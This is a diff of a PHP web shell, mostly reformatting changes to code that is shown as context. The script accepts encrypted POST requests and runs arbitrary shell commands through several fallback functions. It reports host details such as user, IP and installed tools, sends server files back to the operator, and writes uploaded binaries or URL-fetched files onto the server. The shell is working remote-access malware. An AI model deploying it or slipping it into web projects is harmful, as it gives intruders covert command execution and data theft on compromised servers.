@@ -4,7 +4,6 @@ ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 
-// This script should be run via HTTP only
 if (php_sapi_name() === 'cli') {
     exit(-1);
 }
@@ -35,19 +34,17 @@ if (isset($_POST['i'])) {
         if (is_function_available('posix_getpwuid')) {
             $owner_uid = posix_getpwuid(posix_geteuid());
             $owner = $owner_uid['name'];
-        }
-        else {
+        } else {
             $owner = get_current_user();
         }
         $ip = "";
         if (isset($_SERVER['SERVER_ADDR'])) {
             $ip = $_SERVER['SERVER_ADDR'];
-        }
-        else {
+        } else {
             $ip = $_SERVER['SERVER_NAME'];
         }
         $output = json_encode(array(
-            'user' => $owner ,
+            'user' => $owner,
             'path' => getcwd(),
             'hostname' => gethostname(),
             'php' => phpversion(),
@@ -55,8 +52,8 @@ if (isset($_POST['i'])) {
             'server' => $_SERVER['SERVER_SOFTWARE'],
             'time' => date('l jS F Y h:i:s A'),
             'ip' => $ip,
-            'client_ip' => get_client_ip() ,
-            'tools' => implode('|', find_tools()) ,
+            'client_ip' => get_client_ip(),
+            'tools' => implode('|', find_tools()),
             'method' => $method
         ));
         echo encrypt($output, $key);
@@ -92,8 +89,7 @@ if (isset($_POST['c'])) {
         if (is_dir($path)) {
             chdir($path);
         }
-    }
-    else {
+    } else {
 
         // Let's run the action
         if (strlen($cmd) > 0) {
@@ -102,10 +98,11 @@ if (isset($_POST['c'])) {
     }
 }
 
+// File manager
 if (isset($_POST['f'])) {
     $files = $_POST['f'];
     if (isset($files['d'])) {
-        foreach($files['d'] as $file) {
+        foreach ($files['d'] as $file) {
             $name = base64_decode(decrypt($file, $key));
             $payload = file_to_base64($name);
             array_push($downloads, array(
@@ -116,32 +113,29 @@ if (isset($_POST['f'])) {
     }
 
     if (isset($files['u'])) {
-        foreach($files['u'] as $encrypted_url) {
+        foreach ($files['u'] as $encrypted_url) {
             $name = base64_decode(decrypt($encrypted_url['n'], $key));
-            $payload = base64_decode(decrypt( $encrypted_url['p'], $key));
+            $payload = base64_decode(decrypt($encrypted_url['p'], $key));
             $result = download_file_from_url($payload, $path, $name);
             if (is_null($result)) {
-                $output.= "Permission denied {$path}/{$name}\n";
-            }
-            elseif ($result == false) {
-                $output.= "Unable to download the file\n";
-            }
-            else {
-                $output.= $result . "\n";
+                $output .= "Permission denied {$path}/{$name}\n";
+            } elseif ($result == false) {
+                $output .= "Unable to download the file\n";
+            } else {
+                $output .= $result . "\n";
             }
         }
     }
 
     if (isset($files['b'])) {
-        foreach($files['b'] as $encrypted_binary) {
+        foreach ($files['b'] as $encrypted_binary) {
             $name = base64_decode(decrypt($encrypted_binary['n'], $key));
             $payload = base64_decode(decrypt($encrypted_binary['p'], $key));
             $result = base64_to_file($payload, $path, $name);
             if (is_null($result)) {
-                $output.= "Permission denied {$path}/{$name}\n";
-            }
-            else {
-                $output.= $result . "\n";
+                $output .= "Permission denied {$path}/{$name}\n";
+            } else {
+                $output .= $result . "\n";
             }
         }
     }
@@ -149,8 +143,8 @@ if (isset($_POST['f'])) {
 
 // Now, we need to return an encrypted json
 $response = array(
-    'output' => base64_encode($output) ,
-    'path' => base64_encode(getcwd()) ,
+    'output' => base64_encode($output),
+    'path' => base64_encode(getcwd()),
     'files' => $downloads
 );
 exit(encrypt(json_encode($response), $key));
@@ -175,20 +169,15 @@ function get_shell_command()
     if ($shell_command === null) {
         if (is_function_available('proc_open')) {
             $shell_command = 'proc_open';
-        }
-        elseif (is_function_available('shell_exec')) {
+        } elseif (is_function_available('shell_exec')) {
             $shell_command = 'shell_exec';
-        }
-        elseif (is_function_available('exec')) {
+        } elseif (is_function_available('exec')) {
             $shell_command = 'exec';
-        }
-        elseif (is_function_available('passthru')) {
+        } elseif (is_function_available('passthru')) {
             $shell_command = 'passthru';
-        }
-        elseif (is_function_available('system')) {
+        } elseif (is_function_available('system')) {
             $shell_command = 'system';
-        }
-        elseif (is_function_available('popen')) {
+        } elseif (is_function_available('popen')) {
             $shell_command = 'popen';
         }
     }
@@ -200,7 +189,7 @@ function get_shell_command()
 function execute_command($command, $win_trick = true)
 {
     if (DIRECTORY_SEPARATOR === '/') {
-        $command.= ' 2>&1';
+        $command .= ' 2>&1';
     }
 
     switch (get_shell_command()) {
@@ -226,11 +215,11 @@ function execute_command($command, $win_trick = true)
                 0 => array(
                     'pipe',
                     'r'
-                ) ,
+                ),
                 1 => array(
                     'pipe',
                     'w'
-                ) ,
+                ),
                 2 => array(
                     'pipe',
                     'w'
@@ -242,19 +231,18 @@ function execute_command($command, $win_trick = true)
                     $old_trick = "C:\\Windows\\System32\\cmd.exe /C {$command}";
                 }
 
-                $process = @proc_open($old_trick, $descriptors, $pipes, getcwd() , null, array(
+                $process = @proc_open($old_trick, $descriptors, $pipes, getcwd(), null, array(
                     'suppress_errors' => false,
                     'bypass_shell' => true
                 ));
                 if (!is_resource($process)) {
                     $old_trick = $command;
-                    $process = @proc_open($old_trick, $descriptors, $pipes, getcwd() , null, array(
+                    $process = @proc_open($old_trick, $descriptors, $pipes, getcwd(), null, array(
                         'suppress_errors' => false,
                         'bypass_shell' => true
                     ));
                 }
-            }
-            else {
+            } else {
                 $process = proc_open($command, $descriptors, $pipes, getcwd());
             }
 
@@ -264,7 +252,7 @@ function execute_command($command, $win_trick = true)
                 $output = stream_get_contents($pipes[1]);
                 fclose($pipes[1]);
                 $error = stream_get_contents($pipes[2]);
-                $output.= $error;
+                $output .= $error;
                 fclose($pipes[2]);
                 $code = proc_close($process);
             }
@@ -307,12 +295,10 @@ function get_client_ip()
     if (!empty($_SERVER['HTTP_CLIENT_IP'])) //check ip from share internet
     {
         $ip = $_SERVER['HTTP_CLIENT_IP'];
-    }
-    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) //to check ip is pass from proxy
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) //to check ip is pass from proxy
     {
         $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
-    }
-    else {
+    } else {
         $ip = $_SERVER['REMOTE_ADDR'];
     }
 
@@ -338,13 +324,12 @@ function find_tools()
     $command = null;
     if (DIRECTORY_SEPARATOR === '/') {
         $command = 'which';
-    }
-    else {
+    } else {
         $command = 'where';
     }
 
     if (!empty($command)) {
-        foreach($tools as $tool) {
+        foreach ($tools as $tool) {
             $output = execute_command("{$command} {$tool}", false);
             if (strlen(trim($output)) > 0) {
                 array_push($found, $tool);
@@ -388,7 +373,7 @@ function download_file_from_url($url, $path, $output_file)
 
     $complete_path = $path . '/' . $output_file;
     $options = array(
-        CURLOPT_FILE => is_resource($complete_path) ? $complete_path : fopen($complete_path, 'w') ,
+        CURLOPT_FILE => is_resource($complete_path) ? $complete_path : fopen($complete_path, 'w'),
         CURLOPT_FOLLOWLOCATION => true,
         CURLOPT_URL => $url,
         CURLOPT_FAILONERROR => true
@@ -403,15 +388,7 @@ function download_file_from_url($url, $path, $output_file)
     return $output_file;
 }
 
-/**
- * Encrypts a string
- *
- * @param string $plaintext  Raw string to be encrypted
- * @param string $secret_key  Encryption key, also required for decryption
- * @param mixed  $method OpenSSL or mcrypt (legacy)
- *
- * @return string Raw data encrypted with a key
- */
+// Encrypt string
 function encrypt($plaintext, $secret_key, $method = 'openssql')
 {
     $cipher = "AES-256-CBC";
@@ -419,34 +396,26 @@ function encrypt($plaintext, $secret_key, $method = 'openssql')
 
     $ivlen = openssl_cipher_iv_length($cipher);
     $iv = openssl_random_pseudo_bytes($ivlen);
-    $ciphertext_raw = openssl_encrypt($plaintext, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
-    $hmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
-    $ciphertext = base64_encode( $iv.$hmac.$ciphertext_raw );
+    $ciphertext_raw = openssl_encrypt($plaintext, $cipher, $key, $options = OPENSSL_RAW_DATA, $iv);
+    $hmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary = true);
+    $ciphertext = base64_encode($iv . $hmac . $ciphertext_raw);
 
     return $ciphertext;
 }
 
-/**
- * Decrypts an encrypted string
- *
- * @param string $ciphertext  Encrypted text to be decrypted
- * @param string $secret_key  Encryption key, also required for decryption
- * @param mixed  $method OpenSSL or mcrypt (legacy)
- *
- * @return string Raw data encrypted with a key
- */
+// Decrypt string
 function decrypt($ciphertext, $secret_key, $method = 'openssql')
 {
-    $cipher="AES-256-CBC";
+    $cipher = "AES-256-CBC";
     $key = hash_pbkdf2('sha256', $secret_key, '', 10000, 0, true);
 
     $c = base64_decode($ciphertext);
     $ivlen = openssl_cipher_iv_length($cipher);
     $iv = substr($c, 0, $ivlen);
-    $hmac = substr($c, $ivlen, $sha2len=32);
-    $ciphertext_raw = substr($c, $ivlen+$sha2len);
-    $original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
-    $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
+    $hmac = substr($c, $ivlen, $sha2len = 32);
+    $ciphertext_raw = substr($c, $ivlen + $sha2len);
+    $original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, $options = OPENSSL_RAW_DATA, $iv);
+    $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary = true);
 
     return hash_equals($hmac, $calcmac) ? $original_plaintext : null;
 }
